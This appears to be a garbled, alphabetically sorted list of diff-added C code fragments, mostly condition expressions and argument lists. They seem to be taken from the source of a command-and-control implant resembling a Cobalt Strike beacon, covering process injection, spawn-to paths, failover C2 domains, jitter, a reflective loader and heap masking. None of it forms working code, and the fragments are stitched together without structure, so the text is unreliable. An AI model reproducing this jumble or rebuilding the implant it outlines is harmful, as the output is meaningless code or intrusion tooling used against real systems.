+(download->file
+(download->remainingData != 0
+(download->remainingData == 0
+(dwInternetStatus == INTERNET_STATUS_CONNECTED_TO_SERVER
+(dwSize
+(entry->allocType == ALLOC_TYPE_MALLOC
+(entry->allocType == ALLOC_TYPE_VIRTUALALLOC
+(entry->callback
+(entry->record.ptr
+(execution
+(execution->processInfo->hThread
+(expanded
+(file
+(file != INVALID_HANDLE_VALUE
+(file == INVALID_HANDLE_VALUE || file == NULL
+(fileSize == INVALID_FILE_SIZE
+(filename
+(filenameSize == 0
+(filepath
+(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY
+(firstFile
+(firstFile == INVALID_HANDLE_VALUE
+(flags
+(forceFailover || (strategy.seconds >= 0 && currentTimestamp > gFailoverStart + strategy.seconds
+(format
+(format->original
+(format->size - format->length >= len
+(format.length - (2 * sizeof(int
+(formatp
+(formatp * format
+(formatp* format
+(fullPathSize > MAX_FILENAME
+(gBlockDlls
+(gCbcKey
+(gCopiedDefaultDomains
+(gDownloadChunk
+(gFailoverAttempts > strategy.failX
+(gFailoverDomainsStr
+(gHeapRecords
+(gHmacKey
+(gIdentityCredentialsParser
+(gIdentityDomain
+(gIdentityToken
+(gImportedPshScript
+(gInternetConnect
+(gInternetOpen
+(gIsFailoverActive && !forceFailover
+(gIsFailoverActive ? 0 : 1
+(gIsHeapFiltering == FALSE && gHeapRecords
+(gLinks[i].bid
+(gLinks[i].bid != bid || gLinks[i].isOpen == FALSE
+(gLinks[i].isOpen
+(gLinks[i].isOpen == TRUE && gLinks[i].bid == bid
+(gLinks[i].lastPingTime >= GetTickCount(
+(gNetworkIsInit
+(gParentPid && !RunIsSameSessionAsCurrent(gParentPid
+(gRecordCapacity + RECORD_CAPACITY_INCREMENT
+(gRecordCount + 1 >= gRecordCapacity
+(gRecords
+(gRecords[i].isHeap
+(gSelectedRandomDomainIndex < 0 || gSelectedRandomDomainIndex >= gRandomTokenCount
+(gSpawnToX64 == NULL || strlen(gSpawnToX64
+(gSpawnToX86 == NULL || strlen(gSpawnToX86
+(gThreadStartAddress
+(hElevationToken == INVALID_HANDLE_VALUE
+(hFile
+(hFileMapping
+(hFileMapping != INVALID_HANDLE_VALUE
+(hFindFile
+(hFindFile == INVALID_HANDLE_VALUE
+(hInternet
+(hPreelevationAuxThread != INVALID_HANDLE_VALUE
+(hPrenamedPipe
+(hProcess
+(hProcess == NULL
+(hRequest
+(hSnapshot
+(hThread
+(hThread == NULL
+(hToken
+(header + *pHeaderLength - sizeof(int
+(header + headerSize - sizeof(int
+(headerSize
+(heapCount + 1
+(hierarchy
+(host == NULL
+(https://github.com/github/gitignore/pull/1529#issuecomment-104372622
+(https://github.com/github/gitignore/pull/2483#issue-259490424
+(https://github.com/libtom/libtomcrypt
+(https://github.com/libtom/libtommath
+(i < size
+(ignoreToken
+(img + entryPoint
+(img + relocation->r_vaddr + 4
+(img + relocation->r_vaddr + relocation->r_type
+(in[i] & 0x0F
+(in[i] >> 4 & 0x0F
+(in[j + 1] - nb
+(injection->isSamePid
+(injection->isSamePid || !injection->isSameArchAsHostSystem || injection->isTemporary
+(injection->thread
+(injection.isSameArchAsHostSystem
+(inlen % 2 == 1
+(int
+(int attempts = 0; attempts < MAX_ATTEMPTS; attempts++
+(int bid
+(int chunkMaxSize
+(int i = 0; i < MAX_LINKS; i++
+(int i = 0; i < gRecordCount; i++
+(int i = 0; i < inlen; i++
+(int i = 0; i < numInterfaces; i++
+(int i = 0; i < numPrivileges; i++
+(int i = 0; i < raw_inlen; i++
+(int i=0; i < gRecordCount; i++
+(int i=0; i<gRecordCount; i++
+(int index = 0; index < MAX_DYNAMIC_FUNCTIONS; ++index
+(int pid
+(int size
+(int step = BeaconDataInt(&parser
+(int total = 0; total < dataLength; total += wrote
+(int total = 0; total < size; total += wrote
+(int type
+(int value
+(int*
+(ioctlresult == SOCKET_ERROR
+(isConnectionFailed
+(isConnectionStrategyFailed
+(isDirectory
+(isPending > 0
+(isProcessX64
+(isThereHostHeader && !isHostHeaderStepDone
+(iterWaitTime
+(jitter >= 100
+(job
+(job->hRead
+(job->hWrite
+(job->id == id
+(job->isDead
+(job->next
+(job->process
+(job->thread
+(lastError
+(lastError == ERROR_ACCESS_DENIED
+(lastError == ERROR_PRIVILEGE_NOT_HELD && CreateProcessWithTokenW
+(lastError == ERROR_SEM_TIMEOUT
+(len <= 0
+(len == 0
+(length != 0 && length <= 256
+(length != sizeof(pid
+(length % 16
+(length == 0
+(length > MAX_NAME
+(length > sizeof(path
+(length >= MAX_CMD
+(listenResult == SOCKET_ERROR
+(locals
+(long
+(long long
+(long*
+(lpAttributeList
+(lpBaseAddress == NULL
+(lpCurrentFindFileData->dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY
+(lpFileMap
+(lpFileName
+(lpFileName == NULL
+(lpFileNameInternal
+(lpModuleName
+(lpPathName
+(mask
+(maxGet != 0
+(maxsz
+(method
+(millis
+(nSize == 0 || size <= nSize + 1
+(name
+(newCmd
+(noinline
+(now.wMonth + 100 * now.wYear
+(oldValue
+(openLink->callbackData == NULL
+(option == METHOD_CREATE_REMOTE_THREAD_S
+(option == METHOD_CREATE_THREAD_S
+(osVersionInfo
+(out
+(outres > outlen
+(pAllocedData
+(pData->isExecuted
+(pInfo->hProcess
+(pInfo->hThread
+(pLen >= REFLECTIVE_LOADER_SIZE && maskedPayload->mzSignature == IMAGE_DOS_SIGNATURE && maskedPayload->smartInjectMagic == 0xF4F4F4F4
+(pSection + offsetInSection
+(param
+(param > recoverableLength
+(parentPid
+(parser
+(parser->length < size
+(parser->length < sizeof(char
+(parser->length < sizeof(int
+(parser->length < sizeof(short
+(parser->length == 0
+(parser->original
+(path
+(pop
+(port
+(position != NULL && position != (char*
+(potentialFuncLocation == NULL
+(potentialFuncLocation == NULL && *currentFunction == NULL
+(prependSize || appendSize
+(prev
+(prev == NULL
+(protocol->channel.handle
+(protocol->channel.socket
+(raw_inlen > outlen
+(read != 0
+(read < 0
+(read <= 0
+(read == 0
+(read == SOCKET_ERROR
+(received == SOCKET_ERROR
+(received > 0
+(recoverableLength
+(recoverableLength <= 0
+(recoverableLength == 0
+(relocation->sof.function != DYNAMIC_FUNC_RELOC
+(relocation->sof.section == DATA_SECTION_RELOC
+(relocation->sof.section == EXE_SECTION_RELOC
+(relocation->sof.section == RDATA_SECTION_RELOC
+(remaining < 0
+(remaining > 0
+(result
+(rsa_import((unsigned char*
+(runUnderConfig
+(s
+(s[0]
+(sa
+(sass
+(sb.size == 0
+(security context
+(sent != SOCKET_ERROR
+(service
+(sha256_desc.name
+(short
+(short port
+(shouldCreateInternetOpen
+(si
+(si->hStdError
+(si->hStdOutput
+(si->hStdOutput && si->hStdError && si->hStdOutput == si->hStdError
+(sid
+(size
+(size + 1
+(size == 0
+(size > dwSize
+(size_t index
+(sizedbuf
+(sizeof(ARGUMENT_ENTRY
+(sizeof(CHANNEL_ENTRY
+(sizeof(DOWNLOAD_CHUNK
+(sizeof(DOWNLOAD_ENTRY
+(sizeof(HEAP_RECORD
+(sizeof(JOB_ENTRY
+(sizeof(OSVERSIONINFOA
+(sizeof(RECORD_ENTRY
+(sizeof(THREAD_INFO
+(sizeof(WEB_RESPONSE
+(sizeof(bapi
+(sizeof(cmd
+(sizeof(data
+(sizeof(datap
+(sock
+(sock != INVALID_SOCKET
+(sock == INVALID_SOCKET
+(sockaddr
+(socket
+(socket == INVALID_HANDLE_VALUE
+(socket == INVALID_SOCKET
+(sprng_desc.name
+(srcLength + 1
+(status
+(step
+(step == STEP_BASE64 ? base64_decode : base64url_decode
+(strategy.failSeconds >= 0
+(strategy.failX >= 0
+(strlen(domains
+(strlen(transform.uriParams
+(struct _PROTOCOL*
+(target
+(targetSocket
+(targetSocket != INVALID_SOCKET
+(te32.th32OwnerProcessID != injection->pid
+(temp == NULL
+(threadInfo->lpParameter
+(tickCount ^ currentPid
+(timeout < GetTickCount(
+(toRead
+(toolhelp
+(toolhelp == INVALID_HANDLE_VALUE
+(total < length
+(totalBytesAvail
+(totalBytesRead < maxGet
+(totalHeaderRead == -1 || totalHeaderRead != headerSize
+(totalRead != length
+(totalRead = 0; totalRead < length; totalRead += read
+(totalRead >= size
+(totalReceived == SOCKET_ERROR
+(totalReceived == size
+(transform->parser
+(transformedLength == 0
+(u_long
+(u_long*
+(unsigned int
+(unsigned long long
+(unsigned long*
+(use MapViewOfFile
+(value
+(void
+(void* Block
+(void* block
+(waitTime
+(webResponse
+(webResponse->content
+(webResponse->data
+(webResponse->header
+(webResponse->socket
+(with potential passwords
+(x
+(x >= 0 && data[x] == '\r' && data[x + 1] == '\n'
+(x86
+(x86 == isProcessX64
+(x86 or x64
